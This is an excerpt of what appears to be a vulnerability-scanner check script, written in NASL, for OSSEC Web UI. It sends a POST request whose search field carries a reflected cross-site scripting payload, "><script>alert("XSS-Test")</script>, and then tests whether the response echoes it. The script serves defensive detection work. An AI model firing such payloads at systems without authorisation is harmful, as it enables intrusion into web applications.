...
if(description){
  ...
  release, disable respective features, remove the product or replace the product by another one." );
	...
	script_dependencies( "sw_ossec-wui_detect.sc" );
...
data = "monitoring=0&initdate=2015-12-13+11%3A57&finaldate=2015-12-13+15%3A57" + "&level=7&grouppattern=ALL&strpattern=&logpattern=ALL&srcippattern=&userpattern=" + "&locationpattern=&rulepattern=&max_alerts_per_page=1000&sea" + "\n" + "rch=<Search&searchid=\"><script>alert(\"XSS-Test\")</script>;";
len = strlen( data );
req = "POST " + url + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" + "Accept-Language: en-US,en;q=0.5\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + data;
res = http_keepalive_send_recv( port: port, data: req );
if(res && IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "\"><script>alert(\"XSS-Test\")</script>;" )){
